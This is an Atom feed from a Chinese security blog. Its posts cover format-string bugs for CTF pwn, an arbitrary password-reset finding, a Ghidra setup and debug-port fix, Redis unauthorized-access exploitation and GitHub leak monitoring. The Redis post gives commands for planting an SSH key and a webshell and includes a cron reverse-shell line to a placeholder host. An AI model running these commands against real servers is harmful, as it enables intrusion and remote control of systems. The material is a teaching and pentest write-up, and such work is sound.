<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zering的博客</title>
  
  <subtitle>记录点滴</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fl4g.cn/"/>
  <updated>2020-09-03T12:36:16.617Z</updated>
  <id>https://fl4g.cn/</id>
  
  <author>
    <name>zering</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN中格式化字符串漏洞</title>
    <link href="https://fl4g.cn/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://fl4g.cn/2020/09/03/PWN中格式化字符串漏洞/</id>
    <published>2020-09-03T07:41:04.000Z</published>
    <updated>2020-09-03T12:36:16.617Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>哈哈哈，太懒了，时隔一年半又来更新博客了。</p><p><img src="/2020/09/03/PWN中格式化字符串漏洞/脸.jpg" alt=""></p><a id="more"></a><h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>最近做pwn的练习，发现格式化字符串漏洞会经常遇到，不太理解，只能抽出时间来研究一下这古老的漏洞。</p><p>首先，我们来看一下常见的样式，（题目为“攻防世界”的string）ida反编译后在某个函数中看到如下的代码：</p><p><img src="/2020/09/03/PWN中格式化字符串漏洞/string格式化字符串.png" alt=""></p><p>通常使用printf函数，根据cdcel调用约定，从右到左逐个压栈，如果传入字符串，则压入该字符串指针。由于printf无法知道被调用之前有多少参数被压入栈中，所以需要使用format参数用以指定到底有多少参数。</p><h3 id="format类型"><a href="#format类型" class="headerlink" title="format类型"></a>format类型</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">表示</th></tr></thead><tbody><tr><td style="text-align:center">%d</td><td style="text-align:center">表示输出十进制整数</td></tr><tr><td style="text-align:center">%n</td><td style="text-align:center">输出所有打印的字符数</td></tr><tr><td style="text-align:center">%x</td><td style="text-align:center">输出十六进制数</td></tr><tr><td style="text-align:center">%s</td><td style="text-align:center">从内存中读取字符串</td></tr><tr><td style="text-align:center">%p</td><td style="text-align:center">显示一个指针</td></tr></tbody></table><p><strong># 特性一： printf()函数的参数个数不固定</strong></p><p>当我们写作printf(str)时，此时参数可控，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p><p>当我们输入format参数大于存在参数时，printf会读取内存内的数据，如图</p><p><img src="/2020/09/03/PWN中格式化字符串漏洞/printf读取内存.jpg" alt=""></p><p>此时我们只有3个参数，而我们使用printf(“%s %d %d %d %x\n”,buf,a,b，c)读取时，需要读取4个数据，此时便会读取到下一个地址的内容。</p><p>以下例进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">    fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在fgets时输入AAAA%08x%08x%08x%08x%08x%08x（%08x为格式化为8位16进制数，左对齐，空位补0），调用printf时输出数值时便会读取到内存中的0x41414141（A的16进制为0x41），输出结果为AAAA000000c8b7fc1c20b7e25438080482100000000141414141。</p><p>如果我们将AAAA修改为某一敏感地址，使用%s读取地址里面的数据，如读取0x41414141地址的数据<code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code></p><p><strong># 特性二：利用%n格式符写入数据</strong></p><p>%n的作用是把前面已经打印的长度写入某个内存地址，（同一个printf中的输出长度）</p><p>如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Before: num = %d\n"</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d%n\n"</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"After: num = %d\n"</span>, num);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时%n成功修改了num的值，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before: num = 66666666</span><br><span class="line">66666666</span><br><span class="line">After: num = 8</span><br></pre></td></tr></table></figure><p><strong># 特性三：自定义打印字符串宽度</strong></p><p>此时我们修改<code>printf(&quot;%d%n\n&quot;, num, &amp;num);</code>为<code>printf(&quot;%100d%n\n&quot;, num, &amp;num);</code>时，最终num输出为100。若改为%.100d或%0100d，则会在6之前输出92个0。</p><p>当我们要把0x8048000地址写入内存时，此时，我们可以使用如下方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%.134512640d%n\n"</span>, num, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After: num = %x\n"</span>, num);</span><br></pre></td></tr></table></figure><p>此外还需要$的配合，如下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"7th: %7$d, 4th: %4$05d\n"</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">80</span>);</span><br></pre></td></tr></table></figure><p>会打印输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7th: 70, 4th: 00040</span><br></pre></td></tr></table></figure><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5。</p><h1 id="0x02-其他相关"><a href="#0x02-其他相关" class="headerlink" title="0x02 其他相关"></a>0x02 其他相关</h1><p>在Stack中Canary found绕过问题：</p><p>系统产生一个随机数，在程序开始和结尾时会进行检查，如果发生改变就会抛出异常。</p><p><img src="/2020/09/03/PWN中格式化字符串漏洞/cancary.jpg" alt=""></p><p>某些题目需要将其先泄漏出来，再填充到结束的位置</p><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="noopener">漏洞挖掘基础之格式化字符串</a></p><p><a href="https://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">格式化字符串漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;哈哈哈，太懒了，时隔一年半又来更新博客了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/09/03/PWN中格式化字符串漏洞/脸.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://fl4g.cn/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://fl4g.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>任意用户密码重置</title>
    <link href="https://fl4g.cn/2019/04/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>https://fl4g.cn/2019/04/28/任意用户密码重置/</id>
    <published>2019-04-28T02:28:31.000Z</published>
    <updated>2020-09-02T07:53:18.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>很久没更新blog，今天描述一下数月前工作中无意间发现的一次比较经典的重置任意用户密码的实例。攻击手段比较简单，简单描述一下。<br><a id="more"></a></p><h1 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h1><p>登录页面如下：<br><img src="/2019/04/28/任意用户密码重置/登录口.png" alt=""></p><p> 查看登录页面发现忘记密码有两种找回方式：</p><ol><li>短信找回密码</li><li><p>邮箱找回密码</p><p>此处关注短信找回密码，邮箱找回问题暂不描述。</p></li></ol><h2 id="第一次检测"><a href="#第一次检测" class="headerlink" title="第一次检测"></a>第一次检测</h2><p> 点击短信找回密码，输入任意工号：<br> <img src="/2019/04/28/任意用户密码重置/短信找回密码.png" alt=""></p><p>此时发现接收验证码手机号可修改，修改成自己手机号进行验证：<br> <img src="/2019/04/28/任意用户密码重置/修改手机号.png" alt=""></p><p>成功进入设置新密码界面。<br><img src="/2019/04/28/任意用户密码重置/设置新密码.png" alt=""></p><p>提交漏洞报告给相关部门进行修改。</p><h2 id="第二次检测"><a href="#第二次检测" class="headerlink" title="第二次检测"></a>第二次检测</h2><p>修改后对漏洞进行复查，此时拥有一个已知账户关联的手机号。</p><p>同样使用短信找回密码，输入已知账户工号进行密码找回，此时为修改后指定手机号进行验证，无法修改。<br><img src="/2019/04/28/任意用户密码重置/指定手机号.png" alt=""></p><p>验证时抓包，修改账户工号ID为任意用户：<br><img src="/2019/04/28/任意用户密码重置/修改ID.png" alt=""></p><p>此时同样进入到设置新密码界面。设置后成功登录修改的账户。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;很久没更新blog，今天描述一下数月前工作中无意间发现的一次比较经典的重置任意用户密码的实例。攻击手段比较简单，简单描述一下。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="密码找回" scheme="https://fl4g.cn/tags/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"/>
    
  </entry>
  
  <entry>
    <title>NSA逆向工具--Ghidra安装及漏洞修复</title>
    <link href="https://fl4g.cn/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/"/>
    <id>https://fl4g.cn/2019/03/07/NSA逆向工具-Ghidra安装及漏洞修复/</id>
    <published>2019-03-07T02:35:51.000Z</published>
    <updated>2020-09-02T07:53:18.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>2019年RSA安全大会上，美国国家安全局（NSA）公布了一款名叫Ghidra的逆向工程工具。Ghidra使用Java编写，具有图形界面，可在Windows，Mac和Linux上运行。</p><p><strong>Ghidra官网地址：</strong><a href="https://ghidra-sre.org/" target="_blank" rel="noopener">https://ghidra-sre.org/</a><br>注：屏蔽了部分国家IP地址，方法大家都懂。。。<br><a id="more"></a></p><h1 id="0x02-安装环境"><a href="#0x02-安装环境" class="headerlink" title="0x02 安装环境"></a>0x02 安装环境</h1><h2 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h2><ul><li>Microsoft Windows 7 or 10 (64位)</li><li>Linux （64位，推荐使用CentOS 7）</li><li>macOS (OS X) 10.8.3+（Mountain Lion或更高版本）<br><strong>注意：</strong> 不推荐使用32位操作系统<br>（本人使用64位的CentOS 7）</li></ul><h2 id="最低要求"><a href="#最低要求" class="headerlink" title="最低要求"></a>最低要求</h2><h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><ul><li>4 GB RAM</li><li>1 GB storage</li></ul><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul><li>JDK 11 或更高版本<br>（推荐使用OpenJDK，地址：<a href="http://jdk.java.net/" target="_blank" rel="noopener">jdk.java.net</a>，本人使用JDK 11.0.2版本。）</li></ul><h1 id="0x03-安装步骤"><a href="#0x03-安装步骤" class="headerlink" title="0x03 安装步骤"></a>0x03 安装步骤</h1><p>解压jdk到本地<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openjdk-11.0.2_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure></p><p><img src="/2019/03/07/NSA逆向工具-Ghidra安装及漏洞修复/OpenJDK.png" alt=""></p><p>将JDK bin目录添加到PATH环境变量。当然我们可以指定Ghidra使用指定的Java启动（在support / launch.properties文件中设置JAVA_HOME_OVERRIDE属性），当Java版本不兼容时，Ghidra会自动查找兼容版本。</p><p>解压Ghidra到本地，进入文件夹，运行ghidraRun，即可打开Ghidra</p><p><img src="/2019/03/07/NSA逆向工具-Ghidra安装及漏洞修复/Ghidra.png" alt=""></p><h1 id="0x04-bugdoor修复"><a href="#0x04-bugdoor修复" class="headerlink" title="0x04 bugdoor修复"></a>0x04 bugdoor修复</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>工具发布后，Matthew Hickey报告了一个安全问题，在调试模式下运行套件时，会向网络打开18001端口，接受任何可以连接的机器的远程命令。</p><p><img src="/2019/03/07/NSA逆向工具-Ghidra安装及漏洞修复/漏洞.PNG" alt=""></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>打开support目录下的launch.sh文件，找到150行代码，将*修改为127.0.0.1，仅监听本机的调试连接，而不是通过网络监听任何主机。</p><p><img src="/2019/03/07/NSA逆向工具-Ghidra安装及漏洞修复/修复.png" alt=""></p><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://ghidra-sre.org/InstallationGuide.html" target="_blank" rel="noopener">Ghidra Installation Guide</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h1&gt;&lt;p&gt;2019年RSA安全大会上，美国国家安全局（NSA）公布了一款名叫Ghidra的逆向工程工具。Ghidra使用Java编写，具有图形界面，可在Windows，Mac和Linux上运行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ghidra官网地址：&lt;/strong&gt;&lt;a href=&quot;https://ghidra-sre.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ghidra-sre.org/&lt;/a&gt;&lt;br&gt;注：屏蔽了部分国家IP地址，方法大家都懂。。。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="逆向" scheme="https://fl4g.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="https://fl4g.cn/2019/02/27/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://fl4g.cn/2019/02/27/Redis未授权访问/</id>
    <published>2019-02-27T06:24:10.000Z</published>
    <updated>2020-09-02T07:53:18.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>Redis默认配置未配置密码，如果Redis以root用户运行，攻击者可以给root账号写入SSH公钥文件，直接通过SSH免密登录服务器。Redis默认端口为6379端口。若此端口未限制公网访问，会导致Redis服务暴露公网，造成未授权访问。<br><a id="more"></a></p><h1 id="0x02-攻击手段"><a href="#0x02-攻击手段" class="headerlink" title="0x02 攻击手段"></a>0x02 攻击手段</h1><h2 id="连接测试"><a href="#连接测试" class="headerlink" title="连接测试"></a>连接测试</h2><p>已知网络靶场IP为219.153.49.228，Redis端 口为47234，提供了http端口为41481。使用redis客户端进行连接尝试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 219.153.49.228 -p 47234</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/连接测试.PNG" alt=""></p><h2 id="本地生成公私钥"><a href="#本地生成公私钥" class="headerlink" title="本地生成公私钥"></a>本地生成公私钥</h2><p>若Redis以root用户运行，可以直接将本地生成的公钥导入到/root/.ssh/authorized.keys文件中实现免密登录。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/生成公私钥.PNG" alt=""></p><h2 id="公钥写入"><a href="#公钥写入" class="headerlink" title="公钥写入"></a>公钥写入</h2><p>由于网络靶场写入/root/.ssh/的权限受限，因此以之前对公司内网测试获取的一台Redis服务器为例。<br>先将公钥写入文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; h.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/公钥写入文件.png" alt=""></p><p>将h.txt的内容写入到redis服务器key为test对应的value中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat h.txt | /usr/redis/./redis-cli -h xxx.xxx.xxx.xxx -p 6389 -x <span class="built_in">set</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/写入value.PNG" alt=""></p><p>设置redis的dbfilename路径为/root/.ssh/authorized_keys，并保存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/修改dbfilename.png" alt=""></p><p>直接使用ssh访问服务器查看权限和文件，可见为root权限用户。<br><img src="/2019/02/27/Redis未授权访问/查看权限.png" alt=""></p><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>网络靶场写入/root/.ssh/的权限受限，且存在php站点，因此尝试写入webshell。<br>设置Redis备份目录为php站点目录：/var/www/html/，文件名任意。<br><img src="/2019/02/27/Redis未授权访问/写入webshell.png" alt=""></p><p>使用浏览器访问webshell，可以正常访问。<br><img src="/2019/02/27/Redis未授权访问/连接webshell.png" alt=""></p><h2 id="写入定时任务"><a href="#写入定时任务" class="headerlink" title="写入定时任务"></a>写入定时任务</h2><p>同理，将Redis备份目录改为/var/spool/cron，使用nc进行监听反弹shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip_addr/port 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure></p><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">Redis未授权访问详解</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h1&gt;&lt;p&gt;Redis默认配置未配置密码，如果Redis以root用户运行，攻击者可以给root账号写入SSH公钥文件，直接通过SSH免密登录服务器。Redis默认端口为6379端口。若此端口未限制公网访问，会导致Redis服务暴露公网，造成未授权访问。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞" scheme="https://fl4g.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>GSIL配置使用--GitHub敏感信息泄露监控</title>
    <link href="https://fl4g.cn/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/"/>
    <id>https://fl4g.cn/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/</id>
    <published>2019-01-22T07:06:30.000Z</published>
    <updated>2020-09-02T07:53:18.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-GSIL介绍"><a href="#0x01-GSIL介绍" class="headerlink" title="0x01 GSIL介绍"></a>0x01 GSIL介绍</h1><p>GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。<br>功能：</p><ul><li>根据rules.gsil规则匹配GitHub内容</li><li>通过邮件告警</li><li>设置计划任务，定期扫描</li></ul><p><strong>GSIL项目主页：</strong><br><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a><br><a id="more"></a></p><h1 id="0x02-GSIL安装配置"><a href="#0x02-GSIL安装配置" class="headerlink" title="0x02 GSIL安装配置"></a>0x02 GSIL安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用python3进行安装,由于同时存在python2，因此使用python3，pip3来调用。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FeeiCN/gsil.git</span><br><span class="line"><span class="built_in">cd</span> gsil/</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>拷贝config.gsil.example为config.gsil，根据README-zh.md指导，配置参考如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[mail]</span><br><span class="line">host : smtp.exmail.qq.com</span><br><span class="line"># SMTP端口(非SSL端口，但会使用TLS加密)</span><br><span class="line">port : 25</span><br><span class="line"># 多个发件人使用逗号(,)分隔</span><br><span class="line">mails : gsil@feei.cn</span><br><span class="line">from : GSIL</span><br><span class="line">password : your_password</span><br><span class="line"># 多个收件人使用逗号(,)分隔</span><br><span class="line">to : feei@feei.cn</span><br><span class="line"></span><br><span class="line">[github]</span><br><span class="line"># 扫描到的漏洞仓库是否立刻Clone到本地（~/.gsil/codes/）</span><br><span class="line"># 此选项用作监控其它厂商，避免因为仓库所有者发现后被删除</span><br><span class="line">clone: false</span><br><span class="line"></span><br><span class="line"># GitHub Token用来调用相关API，多个Token使用逗号(,)分隔</span><br><span class="line"># https://github.com/settings/tokens</span><br><span class="line">tokens : your_token</span><br></pre></td></tr></table></figure></p><ol><li><p>mail设置部分<br>查看qq邮箱smtp服务器，如下：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/QQ邮箱服务器.PNG" alt=""></p><p>修改host为smtp.qq.com,port为465。</p><p>mails填写自己QQ邮箱，<em>注意</em>，此处password并非填写QQ邮箱密码，需要填写QQ邮箱授权码，<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=1001256" target="_blank" rel="noopener">授权码获取流程</a>：</p><p>进入设置－》帐户页面找到如下页面：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/开启QQ邮箱SMTP服务.PNG" alt=""></p><p>点击开启POP3/SMTP服务，进行密保验证：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/密保验证.PNG" alt=""></p><p>获取授权码后填入password中。</p><p>最后需要在“to : <a href="mailto:feei@feei.cn" target="_blank" rel="noopener">feei@feei.cn</a>”下一行添加“cc ：<a href="mailto:feei@feei.cn" target="_blank" rel="noopener">feei@feei.cn</a>”抄送邮箱，不然后面运行会报错。</p></li><li><p>GitHub设置部分<br>登录GitHub账号，设置tokens的页面说明文档已经给出：<br><a href="https://github.com/settings/tokens" target="_blank" rel="noopener">https://github.com/settings/tokens</a></p><p>点击Generate new token，出现如下页面：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token.PNG" alt=""></p><p>填写token的描述，本人只勾选了repo下的public_repo。保存后出现如下信息：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token信息.PNG" alt=""></p><p>注意保存下token，token只显示一次，后续再登录无法重新获取。填入tokens中。配置结束。</p></li></ol><h1 id="GSIL使用"><a href="#GSIL使用" class="headerlink" title="GSIL使用"></a>GSIL使用</h1><p>根据示例文件配置好rules.gsil规则，使用如下命令进行测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gsil.py --verify-tokens</span><br></pre></td></tr></table></figure></p><p>成功执行<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/gsil测试.PNG" alt=""></p><p>其他运行方式具体查看README-zh.md文档。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-GSIL介绍&quot;&gt;&lt;a href=&quot;#0x01-GSIL介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 GSIL介绍&quot;&gt;&lt;/a&gt;0x01 GSIL介绍&lt;/h1&gt;&lt;p&gt;GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。&lt;br&gt;功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据rules.gsil规则匹配GitHub内容&lt;/li&gt;
&lt;li&gt;通过邮件告警&lt;/li&gt;
&lt;li&gt;设置计划任务，定期扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;GSIL项目主页：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/FeeiCN/GSIL&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GSIL&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="信息泄露" scheme="https://fl4g.cn/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="GitHub" scheme="https://fl4g.cn/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习笔记2--堆栈的缓冲区溢出</title>
    <link href="https://fl4g.cn/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://fl4g.cn/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/</id>
    <published>2019-01-15T02:31:14.000Z</published>
    <updated>2020-09-02T07:53:18.486Z</updated>
    
